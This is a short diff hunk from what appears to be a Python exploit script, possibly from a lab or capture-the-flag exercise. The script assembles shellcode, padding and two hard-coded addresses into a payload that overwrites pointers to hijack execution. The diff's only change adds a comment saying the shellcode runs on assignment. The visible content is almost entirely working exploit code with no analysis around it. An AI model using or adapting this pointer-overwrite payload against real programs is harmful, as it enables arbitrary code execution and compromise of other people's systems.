@@ -7,4 +7,5 @@ nops = b'a'*1995
 addrA = pack("<I", 0xfff6b940)
 # address for return(stack pointer) to put in p
 addrP = pack("<I", 0xfff6c15c)
+# overwrite the pointers so the shellcode is executed on assignment
 sys.stdout.buffer.write(shellcode+nops+addrA+addrP)
